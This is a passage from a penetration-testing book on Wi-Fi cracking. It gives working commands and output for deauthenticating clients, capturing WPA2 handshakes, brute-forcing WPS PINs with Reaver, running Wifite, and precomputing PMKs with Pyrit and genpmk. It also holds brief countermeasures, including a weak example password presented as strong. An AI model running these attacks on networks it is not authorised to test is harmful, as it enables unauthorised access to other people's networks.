+      Transient Key  : D9 E6 11 68 BC F0 0D DF 75 BB 36 ED 38 F2 8A 22  
+                       BA DA 5F 97 CF 2E 6F B1 49 3A 53 2B 45 78 7C 0C  
+                       56 C8 EC D5 BD 64 99 04 E7 0C 1A 7C 2C D7 87 C4  
+                       D5 90 50 E6 ED 40 60 94 BB C9 06 AA 55 35 FF 88  
+ 
+      EAPOL HMAC     : 99 92 11 87 16 7C 8D F2 D1 F9 9B 8E DF 6F 4D 86  
+ 
+Remember the wpa.conf file  we created while configuring alfa card? Match it’s psk variable 
+and aircrack -ng’s Master Key . It verifies for us that the key is decrypted correctly, as we 
+knew it already  
+Countermeasures  
+ 
+Use a strong password. And don’t be that guy…  
+ 
+Example:  Myp@sword 8@# , is a strong password  
+As it has  
+1. No order in plain English language  
+2. 13 Character password, very secured  
+3. Alpha -numeric and special characters in one 
+makes a very strong password.  
+4. Upper and Lower -case characters.  
+5. No pattern  
+6. Not a mobile number, as mobile numbers can be easily guessed.  
+ 
+Or you can just keep a password with some special characters, a word that isn’t a pattern or 
+
+
+ 
+58 a dictionary word.  
+ 
+Conclusion  
+We learned the process involved in WPA cracking.  
+Here is a list of commands we went through the capt ure and the cracking process  
+ 
+airmon-ng check kill       #Kill troublesome  processes  
+airmon-ng start wlan 0 
+airodump -ng wlan0mon 
+airodump -ng --bssid 64:66:B3:6E:B0: 8A -c 11 wlan 0mon -w rootsh3ll  
+aireplay -ng --deauth 5 -a 64:66:B3:6E:B0:8A wlan 0mon 
+aircrack -ng rootsh3ll -01.cap dict   #Crack the passphrase  
+ 
+That’s all for WPA2 for now.  
+In next chapter,  we will learn how to crack WPS, and why WPS?   
+
+ 
+59 WPS cracking  
+ 
+What is WPS ? 
+WPS stands for Wi -Fi Protected Setup and was designed to make setting a secure AP simple r 
+for the average homeowner. First introduced in 2006, by 2011 it was discovered that it had 
+a serious design flaw. The WPS PIN could be brute -forced rather simply using tools like 
+Reaver.  
+What is Reaver ? 
+Reaver is a free, open -source WPS cracking tool whi ch exploits a security hole in wireless 
+routers and can crack WPS -Enabled router’s current password with relative ease. It comes 
+pre-installed in Kali Linux and can be installed on other Linux distros via  source code . Reaver 
+performs a brute force attack against an access point’s Wi-Fi Protected Setup pin number. 
+Once the WPS pin is found, the WPA PSK can be recovered  
+  
+Description:  
+Reaver -wps targets the external registrar functionality  mandated by the Wi-Fi Protected 
+Setup specification. Access points will provide authenticated registrars with their current 
+wireless configuration (including the WPA PSK), and also accept a new configuration from 
+the registrar.  
+In order to authenticate as  a registrar, the registrar must prove its knowledge of the AP’s 8 -
+digit pin number. Registrars may authenticate themselves to an AP at any time without any 
+user interaction. Because the WPS protocol is conducted over EAP, the registrar need only 
+be associ ated with the AP and does not need any prior knowledge of the wireless 
+encryption or configuration.  
+Reaver -wps performs a brute force attack against the AP, attempting every possible 
+combination in order to guess the AP’s 8-digit  pin number. Since the pin numbers are all 
+numeric, there are 10^8 (100,000,000 -1 = 99,999,999 ) possible values for any given pin 
+number, considering 00,000,000 is not the key. However, because the last digit of the pin is 
+a checksum value which can be calculated based on the previo us 7 digits, that key space is 
+reduced to 10^7 (10,000,000 -1 =9,999,999 ) possible values, again as checksum of first 6 
+zeros will be zero, we remove 0,000,000 to be brute -forced.  
+The key space is reduced even further due to the fact that the WPS authentica tion protocol 
+cuts the pin in half and validates each half individually. That means that there are (10^ 4)-1 
+i.e. 9,999  possible values for the first half of the pin and (10^3) -1 i.e. 999 possible values for 
+the second half of the pin, with the last digit o f the pin being a checksum.  
+Reaver -wps brute forces the first half of the pin and then the second half of the pin, 
+meaning that the entire key space for the WPS pin number can be exhausted 
+in 10,999  attempts. The speed at which Reaver can test pin numbers is entirely limited by 
+the speed at which the AP can process WPS requests. Some APs are fast enough that one 
+
+ 
+60 pin can be tested every second; others are slower and only allowing  one pin every ten 
+seconds. Statistically, it will only take half of that time i n order to guess the correct pin 
+number.  
+Installing Reaver from Source Code:  
+System: Ubuntu /Debian  
+sudo apt -get install libpcap -dev sqlite3 libsqlite3 -dev libpcap0.8 -dev 
+wget http://reaver -wps.googlecode.com/files/reaver -1.4.tar.gz  
+tar zxvf reaver -1.4.tar. gz 
+cd reaver -1.4 
+cd src 
+./configure  
+make 
+sudo make install  
+ 
+If you’ve read previous tutorial, you will know that first we have to put our wireless card on 
+monitor mode and then start scanning.  
+ 
+Step 1 : Putting Card on Monitor Mode  
+First kill the programs t hat may cause issues, then we will put our card into monitor mode.  
+sudo airmon -ng check kill  
+sudo airmon -ng start wlan 0 
+ 
+wlan1 is the wireless interface in my case, you can check yours by simply typing in terminal.  
+iwconfig 
+ 
+Step 2 : Scanning the Air for WP S Networks  
+Airodump -ng has a limitation, it cannot  detect WPS enabled routers. So, for that purpose we 
+use wash command  which  installs along with Reaver and helps us scanning for WPS enabled 
+routers.  
+ 
+sudo wash -i wlan0mon 
+ 
+It will show a similar output:  
+ 
+ 
+Note the “WPS Locked” column; this is far from a definitive indicator, but in general, you’ll 
+find that APs which are listed as unlocked are much more likely to be susceptible to brute 
+
+
+ 
+61 forcing. You can still attempt to launch an attack against a network which is WPS locked, but 
+the chances of success aren’t very good.  Here,  
+ 
+ESSID/Target :  rootsh3ll  
+BSSID :   EC:1A:59:43:3F:FD  
+Channel :   11 
+WPS Locked :   Yes 
+ 
+In case you’re getting an output like this:  
+ 
+Just add -C or --ignore -fcs with the previous comman d to skip  
+ 
+wash -i wlan0mon -C 
+wash -i wlan0mon --ignore-fcs 
+ 
+Both will work the same, and ignore FCS packets and you will get previously shown output.  
+ 
+Step 3 : Fire up Reaver  
+After getting the target A P’s BSSID,  use Reaver to try WPS pin attack on it. 
+reaver -i wlan0mon -b EC:1A:59:43:3F:FD  
+ 
+In some case, BSSID may be cloaked, or duplicated by another attacker. In that case Re aver 
+won’t be able to successfully conduct WPS pin attack. You’ll have to be more precise by 
+providing ESSID and channel number, we earlier noted to Reaver . 
+ 
+reaver -i wlan0mon -b EC:1A:59:43:3F:FD -c 11 -e “rootsh3ll”  
+ESSID may contain spaces, so always include ESSID in quotes.  
+ 
+Step 4 : Cracking WPS  
+This part is actually done by Reaver itself, as we’ve already provided necessary infor mation 
+to it. If the router is vulnerable to WPS Pin attack, it will show you an output like this:  
+ 
+[+] Trying pin 12345670  
+[+] Sending EAPOL START request  
+[+] Received identity request  
+[+] Sending identity response  
+
+
+ 
+62 [+] Received M1 message  
+[+] Sending M2 m essage 
+[+] Received M 3 message 
+[+] Sending M4 message  
+[+] Received WSC NACK  
+[+] Sending WSC NACK  
+[+] Trying pin 00005678  
+ 
+If Reaver succeeds in Trying one pin after another, WPS pin and corresponding WPA2 -PSK 
+key is most like to be broken in couple of hour s (3-5). 
+It is quite funny that WPS was supposed to provide ease and security to the home users , but 
+a vulnerable WPS enabled router allows a potential attacker to break the security with ease. 
+Not only the WPS key, but also the WPA2 Pre -Shared Key that is  considerably a lot hard to 
+crack without WPS.  
+ 
+An Ugly Truth about WPS [For Pentesters]  
+It’s important to note that new APs no longer have this vulnerability. T his attack will only 
+work on routers  sold during that 2006 and early 2012. Since people keep routers  for many 
+years, there are still  plenty  of vulnerable ones around. So once in a while this technique 
+could  be useful.  
+Supported Wireless Drivers  
+The following wireless drivers have been tested or reported to work successfully with 
+Reaver -wps:  
+• ath9k  
+• rtl8187  
+• carl19170  
+• ipw2000  
+• rt2800pci  
+• rt73usb  
+ 
+Partially Supported  
+The following wireless drivers have had mixed success, and may or may not work depending 
+on your wireless card (i.e., if you are having problems with these drivers/cards, consider 
+trying a new card before submitting a trouble ticket):  
+• ath5k  
+• iwlan 
+• rtl2800usb  
+• b43 
+ 
+Not Supported  
+The following wireless drivers/cards have been tested or reported to not work properly with 
+Reaver:  
+• iwl4965  
+
+ 
+63 • RT3070L  
+• Netgear WG111v3  
+ 
+Countermeasures  
+1. Turn off the WPS by the  WPS push button, if vulnerable.  
+2. Do not use WPS, if your router is vulnerable and use a strong WPA2 passphrase.  
+3. Check whether your router is manufactured after 2012, It may not be vulnerable.  
+  
+
+ 
+64 3 
+Automated Wi -Fi 
+ Cracking  
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+Wifite: Automated Wirele ss Hacking/Auditing Tool  
+ 
+Wifite is a tool to audit WEP or WPA/2 encrypted wireless networks.  It uses aircrack -ng, 
+pyrit, reaver, tshark tools to perform the audit. It  is a Linux platform tool ( comes pre -
+installed on Kali, Backtrack, Pentoo, BackBox, and other pentesting distributions)  coded in 
+Python. It automate s the Wi-Fi hacking process and aims at minimizing the user inputs by 
+scanning and using Python libraries for automation techniques.  
+It uses tools like aircrack -ng, reaver, tshark, cowpatty for va rious purposes like  
+• Enabling monitor mode  
+• Scanning air  
+• Capturing handshake  
+• Validating handshake  
+• Cracking key  
+• analysing  output and captured packets etc.  
+  
+
+ 
+65 Before we start the tool, we do need to learn how to install the tool and make it working 
+like a comma nd as it comes in all the pentesting distros. Here are the steps we will be 
+covering in this tutorial.  
+● Downloading Wifite  
+● Installing Wifite as a system command  
+● Cracking WEP using Wifite  
+● Cracking WPA/2 using Wifite  
+● How to fix WPA/2 handshake capture error i n Wifite  
+● Focusing Wifite  
+Let’s begin.  
+Download  Wifite  
+Wifite was previously hosted on code.google.com, but it is now a full -fledged project and 
+hosted on GitHub. For all the latest updates,  you should go for the GitHub link, that you may 
+find on Search eng ine’s results.  
+You may directly download it here  https://github.com/derv82/wifite  
+Latest version ( at the time of writing ) is r87. Kali includes r87 version by default, but that 
+version has an error that w e will see to fix in this tutorial.  
+Installing a tool (Wifite ) as a command  in Linux  
+Making it handy to simply open the terminal, or access it from anywhere, and use wifite as a 
+command and not a path/to/the wifite.py. This is not only limited for this scr ipt i.e. Wifite, 
+but you can apply this to any working tool/script/program on your Linux platform to make 
+and run it as-a-command .  
+We have already downloaded the latest Wifite script and assume that it is stored on our 
+Desktop.  
+Move to Desktop  
+ 
+cd ~/Deskt op 
+ 
+~ reflects the HOME  Directory to the shell. Check your home directory with  echo $HOME  
+Here  $HOME  is an environment variable.  /Desktop  is the directory stored in the HOME 
+directory.  
+ 
+unzip wifite*.zip  
+ 
+unzip is the tool to extract files from a .zip file . wifite*.zip means any file with starting name 
+Wifite and ending with .zip, here “*” means anything (including blank).  
+ 
+cd wifite*/  
+ 
+Changes the pointer to first direct ory starting with name “wifite” and / symbolizes  directory.  
+check if the script works o r not,  
+
+ 
+66 python wifite.py  
+ 
+as wifite is a python script. If it (or any script) is working fine you might like to make it a 
+system command so that you don’t have to traverse the directory every time. It is better to 
+just open the terminal and  get to work.   
+For that you should know where the actual executable commands are stored in Linux, so 
+that we can  make a copy there . Like in Windows systems, all the CMD commands are stored 
+in \WINDOWS \System32 \. 
+Enter which  followed  by a simple “ Linux  command  “ 
+ 
+which ls  
+ 
+which  command tells us the location of the command passed as an argument to it. which is 
+ls (ell-ess) in this case. It will reflect /usr/bin/ls  as output.  
+From here we know that ls, executable file is stored in  /usr/bin  directory.  
+Now, what we have to d o is move our wifite script to /usr/bin/  and make it executable, if 
+not already.  
+Moving wifite.py to /usr/bin/ (we are in  ~/Desktop/wifite/ ). Use sudo if you’re non -root  
+sudo cp wifite.py /usr/bin/wifite  
+ 
+sudo  stands for  Super user  DO. Used to take root  (Super User ) permission to perform 
+certain tasks.  
+ 
+cp is used to copy files, Syntax: cp “Source” “Destination”, where Source is wifite.py and 
+destination is /usr/bin/wifite. Also,  wifite is the output filename that we would like to use as 
+command.  
+ 
+cp wifite.p y /usr/bin/wifite.py  
+ls -l ./wifite.py /usr/bin/wifite  
+-rwxr-xr-x 1 root root 161588 Jul 4 15:10 /usr/bin/wifite.py  
+-rwxr-xr-x 1 root root 161588 Jul 4 15:08 wifite.py  
+ 
+Here  rwx stands for Read, Write, Executable. All of them are file attributes.  
+Making wi fite Executable ( if not already), so that no need to write python before the file 
+name.  
+sudo chmod +x /usr/bin/wifite  
+ 
+chmod  changes the file( /usr/bin/wifite ) mod e to +x, i.e. executable.  
+Now wifite is a system command you can enter  sudo wifite  anywhere in  Terminal (as root)  
+Let’s now move on to Cracking.  
+ 
+Cracking WEP using Wifite  
+Cracking WEP using any automated tool is  too easy task as you don’t have to analyse  
+anything, just see target, choose vulnerable AP and hit [ ENTER ].  
+
+ 
+67 I don ’t recommend using any automation  tool unless you’ve learned the actual working of 
+the script or the process that runs behind the script. Scripts are only to reduce time and 
+effort.  
+Please don’t rely upon scripts. Better go ahead and learn the real process by yourself, then 
+use automation  tools to save your time.  
+ 
+I am running root account by default. If you are running standard account, use sudo .  
+ 
+wifite 
+ 
+After running wifite , wait for it to show you the AP List.  
+ 
+Press  CTRL -C and select desired AP with enc ryption  type WEP an d type its NUM, see the 
+image below.  
+ 
+Just wait for Wifite to capture the IVs ( initialisation  Vector) and crack the key for you.  
+WEP cracking is the easiest of all. that is the one of the reasons that WEP is now 
+depreciated, but still you may find it in ma ny places where people haven’t changed their 
+router from a while.  
+ 
+Things to note:  
+1. Wifite start the cracking after 10K IVs.  
+2. Around 60K IVs might be required to crack key.  
+3. Success rate is 99.9%.  
+4. Make sure capture speed is 100+ IVs/second . 
+ 
+ 
+
+
+ 
+68 After Wifite ca ptures eno ugh IVs to crack the WEP key, you would see a similar output : 
+ 
+Note in the image above, total IVs captured are 52,846 with a speed of 857 iv/sec  and the 
+Key is cracked.  
+ 
+If you have enough IV s, WEP key will be cracked for sure  regardless of the l ength, 
+complexity of the key.  
+ 
+How to fix it? As told earlier, use WPA/2.  
+ 
+Let’s move on to WPA/2 cracking.  
+  
+
+
+ 
+69 Cracking WPA/2 using Wifite  
+Unlike WEP, WPA/2 encryption algorithm is way much stronger and perhaps considered the 
+strongest encryption at this mo ment. WPA2 encryption algorithm is not really broken but 
+we manipulate the Key authentication mechanism used by WPA2 to discover the key.  
+Similar to above example.  
+ 
+Run wifite  and select the desired (WPA/2 enabled)  AP. 
+ 
+First few steps may go somewhat l ike this:  
+ 
+We are targeting  rootsh3ll,  which is WPA2 type.  
+You can also select multiple APs, just by putting commas.  Ex: 4,1,3,2  
+Here order will follow according to the input, means Wifite will try AP #4 at first place, AP #1 
+at second place  and so on as i nput is provided.  
+After capturing the handshake Wifite may behave in 2 ways depending on versions (r87 or 
+earlier)  
+ 
+version r87 : Selects a default dictiona ry already stored in Kali Linux.  
+Ex: r0cky0u.txt , darkc0de.lst  etc. In new version default dictionary  used is located 
+here:  /usr/share/fuzzdb/wordlists -user -passwd/passwds/phpbb.txt  
+ 
+version r85 or earlier : Does not use any wordlist until -dict option is provided along with a 
+dictionary file. Example:  
+ 
+wifite -dict /path/to/dictionary.txt  
+ 
+Soon after Wifi te(r87) captures handshake you should  see a similar option:  
+
+
+ 
+70  
+Wifite used a stored dictionary on Kali Linux by itself, no option provided and password was 
+not in the dictionary so crack attempt failed.  
+That is what us ually happens in WPA2 cracking. C rackin g don’t succeed as there are 
+enormous no. of possibilities for a WPA2 type passwords that lies from  8-63 characters  
+range.  Which  could be an amalgamation of  Alphabets [ a-z, A-z], Number [ 0-9] and Special 
+characters  (!, @, #, $  etc.) 
+But no need to feel low . There are  various  methods also to retrieve WPA2 Passphrase, some 
+of which we will learn in this  book.  
+In the above image,  you can see the path in which Wifite has stored the .cap  (handshake)  
+file i.e. /hs/. You can copy the file and use it for manual bru te-forcing.  
+ 
+How to fix WPA/2 handshake capture error in Wifite?  
+If you  frequently use  Wifite, you may have encountered an issue related to the handshake 
+capturing part of Wifite. If you are not familiar, then here is the error:  
+ 
+Wifite keep s on listening for handshake and deauth -ing the connected clients in a loop and 
+not capturing any handshake  for whatsoever reason. Whilst if you start airodump -ng in a 
+new  terminal it will capture the h andshake(s). Wifite is deauth -ing the clients again and 
+again airodum p-ng will keep on capturing handshake (s). 
+So, what is the issue?  is it with the script?  
+Yes, there was an issue in the Wifite script (r85, 587[old] in which auto -deauth during 
+handshake capture was not guaranteed to deauth as expected intervals resulting i n the 
+handshake capture failure.  
+This issue can be fixed in 2 ways:  
+1. Use airodump -ng to capture files.  
+2. Use latest version of Wifite  
+
+
+ 
+71  
+Using airodump -ng to fix Wifite Handshake issue  
+This one is very simple. While Wifite is running in background and failing t o capture 
+handshake. just open a new Terminal and run  airodump -ng followed by 
+the output_filename  and Interface  BSSID  and channel_no . 
+ 
+airodump -ng wlan0mon -c 11 -w cap_file -b <BSSID> 
+ 
+If there are connected clients, Wifite will deauth them and airodump -ng will capture the 
+handshake . 
+Then press  CTRL -C and have fun with your captured file.  
+ 
+BSSID, Channel are very important, as our wireless card can operate at 1 frequency at a 
+moment. Wifite locks  the wireless card on the Channel no.(frequency) similar to t he AP’s we 
+are trying to capture handshake for. A nd by default,  airodump -ng hops between the 
+channels . So, to avoid the errors we need to tell airodump -ng to  lock itself on our desired 
+channel i.e . Channel 11  in this case. Also, to avoid another  AP’s hands hake that might be 
+operating on similar channel we use BSSID as a filter.  
+ 
+Use latest version of Wifite to fix Handshake capture issue  
+If you are using older Kali Linux , BackBox, Ubuntu, Mint etc. and facing the issue, you should 
+try updating your Wifite v ersion. You can do it in 2 ways.  
+• Use wifite  -update  command. Didn’t work?  
+• Try downloading manually and running the script.  
+Here is a thing to note while you might be updating using  wifite -update  command. You 
+might see this output  
+ 
+  .;'                     `;,     
+ .;'  ,;'             `;,  `;,   WiFite v2 (r87)  
+.;'  ,;'  ,;'     `;,  `;,  `;,   
+::   ::   :    ( )   :   ::   ::   automated wireless auditor  
+':.  ':.  ':.  /_\ ,:'  ,:'  ,:'    
+ ':.  ':.     /___\    ,:'  ,:'    designed for Linux  
+  ':.       /_____\      ,:'      
+           /       \              
+[!] upgrading requires an internet connection  
+[+] checking for latest version…  
+[-] your copy of wifite is up to date  
+[+] quitting  
+ 
+ 
+What usually happens is Wifite check for the latest version on GitHub, no t by the file size  
+but by the version i.e. r87 which is  pre-installed on Kali Linux . But here’s a catch, if you look 
+at the last update of wifite on GitHub page it was >3 months ago and the version installed in 
+Kali are both same i.e. r87 but file size  differs as Kali’s version of wifite isn’t fixed but 5 
+months earlier version is r87 but fixed one.  
+
+ 
+72 We will check it by downloading the latest wifite script from GitHub and comparing the file 
+size of both scripts.  
+ 
+Here is what I got when checking file size of  both wifite scripts i.e. one downloaded and 
+other pre -installed.   both are r87  
+ls -lh $(which wifite ) wifite.py   
+-rwxr-xr-x 1 root root 154K Jul 23 2016 /usr/bin/wifite  
+-rwxr-xr-x 1 root root 158K Jul 4 15:08 wifite.py  
+ 
+ls -l $(which wifite) wifite.py  
+-rwxr-xr-x 1 root root 157295 Jul 23 2016 /usr/bin/wifite  
+-rwxr-xr-x 1 root root 161588 Jul 4 15:08 wifite.py  
+ 
+let’s  understand the above output in 2 parts  
+ 
+ls -lh $(which wifite)  wifite.py  
+ 
+Command Breakdown : 
+ ls: command is used to list files in a certain directory,  
+-lh:  command line arguments where ‘l’ (ell, lowercase) stands for listing the file details and ‘h’ 
+ means  file size must be human -readable.  
+$(): A bash function used to execute another command within a command, which we used to get 
+ the path to installed wifite script using which  command.  
+ 
+In Linux world,  dot ‘.’  stands for current  directory , followed by “ /” i.e. directory  (not file).  
+So “./” stands for inside current directory and  ./wifite.py  is the file -name( wifite.py ) in the current director y(./) 
+It allows bash to differentiate file location with commands.  
+ 
+Now notice the file -size for both, its 15 4 and 158 KB, respectively.  
+You are now familiar to the commands used. Let’s jump onto the file -size 
+ 
+Latest r87 version:  161588  Bytes  
+Old r87 vers ion: 157295  Bytes  
+ 
+This change in the size is due to the edited code. From the older version,  many lines are 
+edited to f ix the Handshake error. So, you can use two of the either options to get the work 
+done.  
+Laser Focused  Wifite  
+Focusing Wifite means using  wifite options to filter the output or the cracking process to 
+save screen clutter, memory, wireless card life and  sometimes headache.  
+ 
+For example,  if we are interested in cracking only WEP type Access points we will use  
+wifite -wep -p0841 
+-p0841  is the type of attack which I have found most useful and working in most of the 
+cases, so it might be better for you too for using -p0841 when cracking WEP, it will save you 
+
+ 
+73 a lot of time while capturing IVs.  
+ 
+Similarly,  for WPA/2, lets also tell wifite to use ou r desired dictionary  
+ 
+wifite -wpa -w /media/drive/wordlists/MY_DICT.txt  
+ 
+Wifite will now use MY_DICT.txt located in  /media/drive/wordlists/  as a wordlist to crack 
+WPA/2 passphrase after capturing handshake.  
+Other filters that you can apply:  
+1. Using specific channel  
+2. Specific BSSID/ESSID  
+3. Certain attack type for WEP/WPA/2  
+4. Setting time limit for WEP/WPA/2 using -wept  and -wpat  options  
+5. and many more.  
+ 
+Just run wifite --help  
+ 
+to display all the available options and attack vectors.  
+  
+
+ 
+74 4 
+Speeding up WPA/2 
+Cracking  
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+Introduction  
+ 
+By now you must be familiar with  capturing 4 -way handshake  and using  it with a wordlist 
+to crack the WPA2 -PSK. There is a tremendous possible namespace of WPA2 passphrases  
+which  can be alphanumeric  including special characters  (8-63 cha racters ). There is also 
+practically no limit to the wordlist we could create . They can even reach Peta /Exa bytes  in 
+size which will take time till next Big Bang for the CPU/GPU to  exhaust the namespace , if it is 
+a strong  password . 
+ 
+So, we need to discover v arious ways to crack the WPA2 -PSK within a short span of time. 
+Which is possible if we somehow get the PSK via router panel, key logger  or use a GPU (not 
+CPU) to use its multiple cores to  reduce cracking duration , or something even different.  
+That is what we will learn in this chapter. We will boost the WPA2 cracking speed without 
+using any GPU or Cloud. Which can be highly  useful with the AP’s with very common name 
+like “Airtel ”, “Netgear “, “Belkin ” etc.  
+  
+
+ 
+75 WPA2 is derived from a highly complicated function  called PBKDF2  (Password Based Key 
+Derivation Function). As name suggests, cracking is dependent on passphrase , also the SSID . 
+This is the bottle neck. PBKDF2 always spits out a 256 -bit key no matter how much complex 
+password you throw at it (8 -63 chars).  
+The PBKDF2 key derivation function has five input parameters:  
+DK = PBKDF2(PRF, Password, Salt, c, dkLen)  
+ 
+Where:  
+PRF:  Pseudorandom function  of 2 parameters with output length  hLen    
+  (HMAC -SHA1 )  
+Password :  Master password from which a derived key is ge nerated  
+Salt:  Sequence of bits, known as a  cryptographic salt  
+C:  Number of iterations, 4096 for WPA2  
+dkLen :  Desired length of the derived key , 256  
+DK:  Generated  derived key , 256 -Bit key  
+ 
+DK = PBKDF2(HMAC -SHA1, Password, Salt, 4096, 256)  
+ 
+Every derived key is unique, which means that if there are 2 access points with different SSID 
+but same Passphrase, there PMK will be completely different . 
+What is PMK?  
+Pairwise Master Key , a 256 -Bit key derived by  PBKDF2  function using 
+the SSID , Passphrase (PSK) and HMA C-SHA1 hash algorithm. This is the differentiating factor  
+used for authenticating between the AP and the Client. It will look like this:  
+ 
+ 
+      Master Key     : 1F 4B 02 FE 4C 82 F4 E0 26 2E 60 97 E7 BA D1 F1  
+                       92 83 B6 68 7F 08 4F 7 3 33 1D B8 6C 62 49 8B 40   
+ 
+      Transient Key  : D9 E6 11 68 BC F0 0D DF 75 BB 36 ED 38 F2 8A 22  
+                       BA DA 5F 97 CF 2E 6F B1 49 3A 53 2B 45 78 7C 0C  
+                       56 C8 EC D5 BD 64 99 04 E7 0C 1A 7C 2C D7 87 C4  
+                       D5 90 50 E6 ED 40 60 94 BB C9 06 AA 55 35 FF 88  
+ 
+      EAPOL HMAC     : 99 92 11 87 16 7C 8D F2 D1 F9 9B 8E DF 6F 4D 86  
+ 
+Do the math,  32 Hexadecimal  values , 1 Hexadecimal  = 8 bits,  
+32*8 =  256 Bit , which is the PMK i.e. 256-Bit key  
+ 
+We can also  cross check this without cracking the key with aircrack -ng. 
+By using wpa_passphrase  command that comes pre -installed on almost every *nix 
+distribution.  
+ 
+Syntax : wpa_passphrase [ SSID ] [Passphrase ] 
+wpa_passphrase rootsh3ll iamrootsh3ll  
+
+ 
+76 We need to insert SSI D along with Passphrase because as  told earlier  WPA2 -PSK is SSID 
+dependent, it changes completely with a slight change in SSID. Now,  
+ 
+wpa_passphra se rootsh3ll iamrootsh3ll > wpa.conf  
+ 
+Display wpa.conf contents:  
+cat wpa.conf  
+network={ 
+    ssid="rootsh3ll " 
+    #psk="iamrootsh3ll"  
+    psk=1f4b02fe4c82f4e0262e6097e7bad1f19283b6687f084f73331db86c62498b40  
+} 
+ 
+Compare  the highlighted value  with the Master K ey above:  
+ 
+It’s exactly the same . Which confirms  that manually calculated PMK and the PMK calculated 
+by aircrack -ng for a specific SSID and Passphrase is the same.  
+Now we will see how to boost the speed.  
+  
+What is CoWPAtty?  
+cowpatty  is a free command line  tool that automates the dictionary attack for WPA -PSK. It 
+runs on Linux. It is an implementation of an offline dictionary attack against WPA/WPA2 
+networks using PSK -based authentication. cowpatty  take 2 typ es of input to crack WPA -PSK:  
+1. Standard Wordlist  
+2. Pre-generated PMKs or Hash  
+ 
+cowpatty  comes pre -installed in Kali Linux and is available to download from  
+www.willhackforsushi.com  
+ 
+What is Pyrit?  
+Pyrit is a tool written in Python that allows you to create  massive databases, pre -compute 
+the WPA2 -PSK to save time. T echnique is called space -time -trade -off. Pyrit supports both 
+CPU and GPU. for using GPU,  you need to install supported graphics driver.  
+Pyrit comes pre -installed in Kali Linu x. Pyrit can be downlo aded from 
+https://github.com/JPaulMora/Pyrit  
+ 
+What is space -time -trade -off? 
+If you remember , in one of the previous chapters we cracked the WPA2 passphrase using 
+aircrack -ng by passing i t a wordlist, which  supposedly contained the actual passphrase. 
+Which is not likely to be possible  usually  as wordlist have no limi t. Passphrase can be in any 
+dictionary we have chosen or maybe even absent in the dictionary . We as a penetration 
+tester just don’t know and als o the cracking speed for the WPA2 -PSK is very low so we need 
+
+ 
+77 to speed up the process somehow. This is where space -time trade -off comes into picture.  
+What we actually do is we pre -compute the PMK (Pairwise Master Key) with corresponding 
+SSID and store it on  a hard drive and we can use it at any time with the Cap file for the same 
+SSID, as WPA2 -PSK is SSID and Password sensitive. As we have pre -computed the PMKs and 
+stored on our hard drive, it is just like a lookup for the system into the table which doesn’t  
+take much time and cracking speed are very high, saving us a lot of time.  
+ 
+Only condition is there must be a Pre -computed file with same SSID and different 
+passphrases picked from a wordlist. Although even this doesn’t guarantee cracking the PSK 
+but crack ing speed is significantly higher than any CPU or GPU, that we will see in this 
+tutorial.  
+ 
+Installation  and configuration  
+ 
+Installing CoWPAtty from Source code  
+Run in  Terminal:  
+cd ~/Desktop  
+wget http://www.willhackforsushi.com/code/cowpatty/4.6/cowpatty -4.6.tgz #Download source 
+tar zxfv cowpatty -4.6.tgz          #Extract Gunzip  file 
+cd cowpatty -4.6/           #Change directory  
+make            #Compile Source code  
+sudo cp cow patty /usr/bin           #Copy cowpatty binary   
+ 
+ 
+Installing Pyrit from Source code  
+Run in Terminal:  
+wget https://pyrit.googlecode.com/files/pyrit -0.4.0.tar.gz   #Download source code  
+tar xvzf pyrit -0.4.0.tar.gz           #Extract Gunzip file 
+cd pyrit -0.4.0            #Move to extracted dir 
+python setup.py build            #Build setup  
+sudo python setup.py install           #Install  Pyrit 
+ 
+  
+
+ 
+78 Generate PMKs Using GenPMK  
+genpmk  is a tool which in stalls along with cowpatty as a substitute for generating the hash 
+file (PMKs) and allowing cowpatty  to crack WPA2 -PSK at higher speeds.  
+Let’s see how to create PMKs using genpmk . 
+ 
+Run in Terminal : 
+Syntax: genpmk -f [wordlist ] -d [output_filename ] -s [SSID ] 
+ 
+genpmk -f "rockyou.txt" -d "GENPMK_rootsh3ll" -s "rootsh3ll"  
+genpmk 1.1 - WPA-PSK precomputation attack. <jwright@hasborg.com>  
+File GENPMK_rootsh3ll does not exist, creating.  
+key no. 1000: skittles1  
+key no. 2000: princess15  
+key no. 3000: unfaithful  
+key no. 4000: andresteamo  
+key no. 5000: hennessy  
+key no. 6000: amigasporsiempre  
+key no. 7000: 0123654789  
+key no. 8000: trinitron  
+key no. 9000: flower22  
+key no. 10000: vincenzo  
+key no. 11000: pensacola  
+key no. 12000: boyracer  
+key no. 13000: grandmom  
+key no. 140 00: battlefield  
+ 
+GENPMK_rootsh3ll  didn’t exist, so genpmk  created a new file. In case the file already exists, the hashes are 
+appended to the existing file.  
+ 
+Now wait for genpmk  to finish  generating  PMKs. And it will show you the average speed 
+(Passphrases /sec) at which it generated PMKs. Mine was  
+ 
+20000 passphrases tested in 54.94 seconds: 363.99 passphrases/second  
+ 
+As I have told already, GenPMK is a single threaded  program. Here you can see that while 
+running GenPMK only one core was used to 100%  
+ 
+Now l et’s move on to Creating PMKs using Pyrit.  
+
+
+ 
+79 Generate PMKs Using Pyrit  
+Run in T erminal:  
+Syntax : pyrit   -o [Output_filename ] -i [Wordlist ] -e [SSID ] passthrough  
+ 
+pyrit -o "PYRIT_rootsh3ll" -i "rockyou.txt" -e "rootsh3ll" passthrough  
+Pyrit 0.5.1 (C) 2008 -2011 Lukas Lueg - 2015 John Mora  
+https://github.com/JPaulMora/Pyrit  
+This code is distributed under the GNU General Public License v3+  
+ 
+Computed 1000000 PMKs total; 2089 PMKs per second  
+ 
+If you notice, options required are still the same we have just changed the  output filename 
+with a prefix “PYRIT” to distinguish the PMKs generated using Pyrit and GenPMK.  
+passthrough is an option in pyrit  used to create the PMKs from the passphrase taken from 
+the dictionary at a moment. Speed is comparatively  high from GenPMK. N otice and 
+compare the speed in  the output above  
+ 
+See the difference ? 
+ 
+363.99 vs. 2089.  
+ 
+why?   
+ 
+Because GenPMK is a single threaded program whereas Pyrit is a tool that utilizes full power 
+of the CPU i.e. either 4, 8 or even 16 cores , pyrit will get the ma ximum power. Which is what 
+makes it better option to choose  for generating PMKs over GenPMK.  
+See the CPU usage while Pyrit was generating PMKs:  
+ 
+Now let’s begin the PSK cracking.  
+  
+
+
+ 
+80 Crack WPA2 -PSK [ CoWPAtty vs. 
+Aircrack -ng] 
+ 
+It would be better if we first  check the aircrack -ng’s cracking speed on this system and then 
+notice a boost in speed using CoWPAtty.  
+ 
